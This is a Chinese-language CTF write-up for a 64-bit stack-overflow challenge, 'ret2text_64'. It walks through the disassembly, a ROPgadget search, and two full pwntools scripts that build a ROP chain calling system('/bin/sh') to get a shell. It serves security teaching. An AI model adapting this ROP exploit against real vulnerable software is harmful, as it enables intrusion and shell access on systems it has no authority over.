# ret2text_64

- 作者：pn1fg
- 参考：W4terCTF 2023
- 难度：Medium
- 分类：Pwn
- 镜像：[svuctf-helloworld-2023/ret2text64](https://ghcr.io/svuctf/svuctf-helloworld-2023/ret2text64)
- 端口：70

## 题目描述

64位栈溢出

## 题目解析

- 源码：[ret2text_64.c](build/ret2text_64.c)
- 考点：64位下ROP - ret2text

这是`ret2text_32`的升级版，64位程序与32位不同，函数在传参的时候是通过寄存器来传参

64位程序传参：

参数：a，b，c，d，e，f，g，h

- 前 6 个：a->%rdi，b->%rsi，c->%rdx，d->%rcx，e->%r8，f->%r9
- 从第七个开始恢复到 32 位传参方式，从右至左压入栈中

______________________________________________________________________

#### 查看文件信息

查看文件类型：

```shell
>>> file ret2text_64
ret2text_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d76b1f973484a43907334ef6a59bce3bd057b539, for GNU/Linux 3.2.0, not stripped
```

这是一个 64 位的 ELF 文件，动态链接，没有去除符号

查看保护机制：

```shell
>>> checksec --file=ret2text_64
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

这里只打开了 NX 保护

#### 分析漏洞成因

反汇编`vuln`函数：

```c
┌ 112: sym.vuln ();
│           ; var size_t nbyte @ rbp-0x4
│           ; var void *buf @ rbp-0x40
│           0x0040125c      f30f1efa       endbr64
│           0x00401260      55             push rbp
│           0x00401261      4889e5         mov rbp, rsp
│           0x00401264      4883ec40       sub rsp, 0x40
│           0x00401268      488d05711100.  lea rax, str.But_this_time..you_need_to_find_the_point_to_get_it_ ; 0x4023e0 ; "But this time..you need to find the point to get it!"
│           0x0040126f      4889c7         mov rdi, rax                ; const char *s
│           0x00401272      e809feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401277      488d05971100.  lea rax, str.Whats_your_age_ ; 0x402415 ; "What's your age?"
│           0x0040127e      4889c7         mov rdi, rax                ; const char *s
│           0x00401281      e8fafdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401286      488d45fc       lea rax, [nbyte]
│           0x0040128a      4889c6         mov rsi, rax
│           0x0040128d      488d05921100.  lea rax, [0x00402426]       ; "%d"
│           0x00401294      4889c7         mov rdi, rax                ; const char *format
│           0x00401297      b800000000     mov eax, 0
│           0x0040129c      e81ffeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x004012a1      488d05811100.  lea rax, str.Now..try_to_overflow_ ; 0x402429 ; "Now..try to overflow!"
│           0x004012a8      4889c7         mov rdi, rax                ; const char *s
│           0x004012ab      e8d0fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012b0      8b55fc         mov edx, dword [nbyte]      ; size_t nbyte
│           0x004012b3      488d45c0       lea rax, [buf]
│           0x004012b7      4889c6         mov rsi, rax                ; void *buf
│           0x004012ba      bf00000000     mov edi, 0                  ; int fildes
│           0x004012bf      b800000000     mov eax, 0
│           0x004012c4      e8d7fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x004012c9      90             nop
│           0x004012ca      c9             leave
└           0x004012cb      c3             ret
```

本题的漏洞点在`read`函数处，从标准输入，读入大小为 nbyte 的数据存入 buf 数组，buf 的大小 0x40，nbyte 的大小由第一次`scanf`函数接收的为准，所以这题的输入大小由我们决定，可以输入超出 buf 的长度，覆盖 `rbp`的值，造成栈溢出

反编译`b4ckdoor`函数

```c
void sym.b4ckdoor(void)

{
    sym.imp.system("echo hi!");
    return;
}
```

`system`调用`echo`输出 hi ，可惜没有调用`/bin/sh`，这里给大家介绍个工具

ROPgadget，利用这个工具我们可精确的查找到程序中的一些字符串，例如查找`/bin/sh`

- 命令格式：ROPgadget --binary FILE --string "/bin/sh"

```shell
>>> ROPgadget --binary ret2text_64 --string "/bin/sh"
Strings information
============================================================
0x0000000000404050 : /bin/sh
```

上面讲述过64位程序传参需要通过寄存器，刚刚的工具也可以用来寻找寄存器

- 命令格式：ROPgadget --binary FILE --only 'pop|ret'

```shell
>>> ROPgadget --binary ret2text_64 --only 'pop|ret'
Gadgets information
============================================================
0x000000000040119d : pop rbp ; ret
0x000000000040123d : pop rdi ; ret
0x000000000040101a : ret

Unique gadgets found: 3
```

本题我们只需要用到`rdi`

分析到这，本题的大概思路就有了，首先溢出，因为没有后门函数，所以需要我们手动在栈上构造 ROP 链调用`system`执行`/bin/sh`从而拿到 shell。

#### 编写利用程序

这里我们提供两种写法供同学们研究，第一种是比较正规的做法，第二种是懒人做法

[exp.py](writeup/exp.py) :

```python
from pwn import *

context.arch = 'amd64'
context.log_level = "debug"

io = process("./ret2text_64")
elf = ELF("./ret2text_64")

pop_rdi_ret = 0x0040123d
bin_sh = 0x00404050
ret = 0x0040101a

io.sendlineafter(b"age?\n", b"1000")

payload = flat([
    cyclic(0x40 + 8),
    pop_rdi_ret,
    bin_sh,
    ret,
    elf.sym["system"]
])
io.sendlineafter(b"overflow!\n", payload)

io.interactive()
```

[exp2.py](writeup/exp2.py) :

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = process("./ret2text_64")
elf = ELF("./ret2text_64")
rop = ROP(elf)

io.sendlineafter(b"age?\n", b"1000")

padding = cyclic(0x40 + 8)
bin_sh = next(elf.search(b"/bin/sh"))
ret = rop.find_gadget(["ret"])

rop.raw(padding)
rop.raw(ret)
rop.call(elf.sym["system"], [bin_sh])
payload = rop.chain()

io.sendlineafter(b"overflow!\n", payload)

io.interactive()
```
